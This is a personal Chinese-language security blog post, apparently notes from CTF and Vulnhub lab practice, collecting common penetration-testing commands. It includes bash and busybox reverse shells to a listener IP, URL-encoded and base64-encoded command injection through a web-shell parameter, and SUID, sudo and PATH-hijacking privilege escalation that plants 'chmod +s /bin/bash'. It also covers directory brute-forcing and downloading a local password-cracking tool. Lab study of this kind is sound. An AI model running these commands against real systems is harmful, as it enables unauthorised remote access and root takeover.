<!doctype html>
<html lang="zh"><head>
<title>X8@0E的博客</title>
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
<meta name="description" content="命令执行反弹shell123456789101112131415161718192021nc -lvp 1234  &#x2F;&#x2F;kali上面监听1.&#x2F;bin&#x2F;bash -c &#x27;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.10&#x2F;1234 0&gt;&amp;1&#x27;  &#x2F;&#x2F;靶机服务器命令执行# 对特殊字符进行 URL 编码curl &quot;http:&#x2F;&#x2F;1">
<meta property="og:type" content="article">
<meta property="og:title" content="X8@0E的博客">
<meta property="og:url" content="http://example.com/2025/08/11/1.%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/index.html">
<meta property="og:site_name" content="X8@0E的博客">
<meta property="og:description" content="命令执行反弹shell123456789101112131415161718192021nc -lvp 1234  &#x2F;&#x2F;kali上面监听1.&#x2F;bin&#x2F;bash -c &#x27;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.10&#x2F;1234 0&gt;&amp;1&#x27;  &#x2F;&#x2F;靶机服务器命令执行# 对特殊字符进行 URL 编码curl &quot;http:&#x2F;&#x2F;1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250914172952407.png">
<meta property="article:published_time" content="2025-08-11T12:22:12.621Z">
<meta property="article:modified_time" content="2025-10-17T03:28:16.052Z">
<meta property="article:author" content="X8@0E">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250914172952407.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761989925384">

<link rel="stylesheet" href="/css/style.css?v=1761989925384">




    
        <link rel="stylesheet" href="/custom.css?v=1761989925384">
    



<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1761989925384"></script>

 

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag("js", new Date());

  gtag("config", "G-4D4ZJ9G024");
</script>


<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="X8@0E">
            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>43</div>
        <div><span>标签</span>77</div>
        <div><span>分类</span>14</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
        
            <form id="search_form">
                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
                    font-size: 15px !important;
                    height: 56px !important;
                    background-image: none;
                "></label>
            </form>
         
    </div>
</div>


	<script async src="/js/search.js?v=1761989925386"></script>



    
        
        <div class="nexmoe-widget-wrap">
	<div class="nexmoe-widget nexmoe-social">
		<a
			class="mdui-ripple"
			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
			target="_blank"
			mdui-tooltip="{content: 'CSDN'}"
			style="
				color: rgb(247, 132, 34);
				background-color: rgba(247, 132, 34, .1);
			"
		>
			<i
				class="nexmoefont icon-github"
			></i> </a
		>
	</div>
</div>

    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
          <span class="category-list-count">3</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
          <span class="category-list-count">7</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
          <span class="category-list-count">4</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
          <span class="category-list-count">15</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
          <span class="category-list-count">1</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/Argon2Cracker/" style="font-size: 10px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 15px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 15px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 15px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 20px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 10px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(77);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">43</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/2025/10/20/Crypto/">Crypto</a>
          </li>
        
          <li>
            <a href="/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/">流量分析恶意攻击</a>
          </li>
        
          <li>
            <a href="/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
          </li>
        
          <li>
            <a href="/2025/10/09/hackableII/">hackablell</a>
          </li>
        
          <li>
            <a href="/2025/10/07/Me-and-My-Girlfriend-1/">Me-and-My-Girlfriend-1</a>
          </li>
        
      </ul>
    </div>
  </div>

    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-link">
		<ul>
        
            <li>
                <a href="" target="_blank" >
                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
                    <p>X8@0E</p>
                </a>
            </li>
        
		</ul>
    </div>
</div>
<style>
.nexmoe-widget-wrap .nexmoe-link ul li a {
    text-align : center;
}
.nexmoe-widget-wrap .nexmoe-link ul li a img {
    max-width : 100%;
}
.nexmoe-widget-wrap .nexmoe-link ul li a p {
    margin: 10px 0;
}
</style>

    
   
    <div class="nexmoe-copyright">
        &copy; 2025 X8@0E
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover"> 
            <img src="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080" alt="" loading="lazy">
            <h1></h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2025年08月11日</a>
        
        
    </div>
    
    
    
    
    
</div>

    <h1 id="命令执行反弹shell"><a href="#命令执行反弹shell" class="headerlink" title="命令执行反弹shell"></a>命令执行反弹shell</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234  //kali上面监听</span><br><span class="line"></span><br><span class="line">1./bin/bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.10/1234 0&gt;&amp;1&#x27;</span>  //靶机服务器命令执行</span><br><span class="line"><span class="comment"># 对特殊字符进行 URL 编码</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.88.30:1898/6ATEUF.php?c=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.88.10%2F1234%200%3E%261%27&quot;</span></span><br><span class="line">2.busybox nc 192.168.88.10 1234 -e /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将命令编码为 base64</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.88.10/1234 0&gt;&amp;1&quot;</span> | <span class="built_in">base64</span></span><br><span class="line"><span class="comment"># 然后通过 base64 解码执行</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.88.30:1898/6ATEUF.php?c=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjEwLzEyMzQgMD4mMQo%3D%20|%20base64%20-d%20|%20bash&quot;</span></span><br><span class="line"></span><br><span class="line">/usr/bin/script -qc /bin/bash /dev/null  //启动一个干净的 bash 会话，且不记录任何操作日志（隐蔽性较强）。</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> //获得交互shell</span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span>   //恢复终端</span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;192.168.56.8/cgi-bin/file.cgi?file=|busybox+nc+192.168.88.10+1234+-e+/bin/bash&#x27;</span> //url反弹shell的命令执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.88.10] from (UNKNOWN) [192.168.88.13] 52520</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">稳定Shell:</span><br><span class="line">script /dev/null -c bash</span><br><span class="line">Ctrl+Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset xterm</span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line"><span class="built_in">stty</span> rows 24 columns 80    //一般最上面的指令就足够了,为了便于后续操作，首先利用 script 命令将当前的Shell升级为功能更完整的交互式TTY。</span><br></pre></td></tr></table></figure>



<h1 id="find找suid权限文件提权"><a href="#find找suid权限文件提权" class="headerlink" title="find找suid权限文件提权"></a>find找suid权限文件提权</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.找到有suid权限的文件</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null  //用于在 Linux 系统中查找具有SUID（Set User ID）权限的可执行文件，通常用于提权检测</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 创建恶意脚本，把恶意代码指令写入有suid权限的文件并且给予其执行权限</span></span><br><span class="line">discuz@Chat2:~$ <span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt; chat</span><br><span class="line">效果：</span><br><span class="line">bash-5.0# <span class="built_in">cat</span> chat</span><br><span class="line"><span class="built_in">chmod</span> +s /bin/bash</span><br><span class="line"></span><br><span class="line">discuz@Chat2:~$ <span class="built_in">chmod</span> +x chat</span><br><span class="line"><span class="comment"># 3. 检查 /bin/bash 当前权限</span></span><br><span class="line">discuz@Chat2:~$ <span class="built_in">ls</span> -la /bin/bash</span><br><span class="line">-rwxr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bash</span><br><span class="line"><span class="comment"># 4. 使用sudo执行我们的脚本，触发恶意代码指令，让/bin/bash有suid权限</span></span><br><span class="line">discuz@Chat2:~$ <span class="built_in">sudo</span> /home/discuz/chat</span><br><span class="line"><span class="comment"># 5. 再次检查 /bin/bash 权限，确认SUID位已添加</span></span><br><span class="line">discuz@Chat2:~$ <span class="built_in">ls</span> -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1168776 Apr 18 2019 /bin/bash</span><br><span class="line"><span class="comment"># 6.执行 bash -p</span></span><br><span class="line"> bash -p 中的 -p 参数告诉bash不要将有效用户ID（euid）重置为实际用户ID（uid）。如果一个可执行文件（如bash）设置了SUID位，普通用户执行它时，进程的euid会变成文件所有者（root）的ID。 -p 参数保留了这个提权后的euid，从而让我们获得root权限的shell。</span><br><span class="line"> </span><br><span class="line">总结：</span><br><span class="line">先找到有suid权限的文件，然后在这个文件里面或者这个文件包含调用的库文件写入<span class="built_in">chmod</span> +s /bin/bash，让/bin/bash有suid权限，一旦/bin/bash有suid权限，就可以执行bash -p来获取root shell</span><br><span class="line"></span><br><span class="line">法二：</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">echo</span><span class="string">&#x27;/bin/bash&#x27;</span>&gt;chat</span><br><span class="line"><span class="built_in">chmod</span> +x chat</span><br><span class="line"><span class="built_in">sudo</span> ./chat</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l 一下发现 root 不需要密码就能执行/root/dircuz/chat</span><br><span class="line">所以可以直接删除这个原有的chat文件，我们自己再在这个目录下创建同名的chat文件，写入 <span class="built_in">echo</span><span class="string">&#x27;/bin/bash&#x27;</span>&gt;chat 到新创建的chat文件里面，然后<span class="built_in">chmod</span> +x chat， 最后 <span class="built_in">sudo</span> ./chat ，<span class="built_in">id</span>就可以看到直接就是root用户了</span><br></pre></td></tr></table></figure>

<h1 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;192.168.56.8/cgi-bin/file.cgi?file=file.cgi&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://open.dsz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x.php,.html,.txt</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>条件：!env_reset 配置，脚本中调用的 df , ls , find , systemctl , cat , free 等一系列命令均未使用其绝对路径（如 &#x2F;bin&#x2F;df ），而是直接使用相对路径。一个经典的<strong>PATH****环境变量劫持</strong>攻击路径就此形成。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l     //查看<span class="built_in">sudo</span>的权限，如(root) NOPASSWD: /usr/local/bin/system-info.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; <span class="built_in">df</span>   //构造恶意脚本</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; <span class="built_in">df</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">df</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -u root /usr/local/bin/system-info.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /bin/bash      //验证/bin/bash的suid权限是否成功</span><br><span class="line"></span><br><span class="line">bash -p</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>      // euid=0(root) 的输出确认我们已成功提权至 root 用户。</span><br></pre></td></tr></table></figure>

<h1 id="suForce本地爆破"><a href="#suForce本地爆破" class="headerlink" title="suForce本地爆破"></a>suForce本地爆破</h1><p>suForce只能在本地爆破本地用户的密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2   //开启服务器</span><br><span class="line"></span><br><span class="line">systemctl status apache2   //查看服务器是否开启</span><br><span class="line"></span><br><span class="line">wget 192.168.88.10/suForce  //如果靶机上面没有wget就换curl</span><br><span class="line"></span><br><span class="line">curl -O http://192.168.88.10/suForce  //-O 表示保存文件到当前目录，使用远程文件名（suForce）</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x suForce   //给予suForce执行权限</span><br><span class="line"></span><br><span class="line">./suForce -u root -w pass   //使用suForce爆破密码</span><br></pre></td></tr></table></figure>

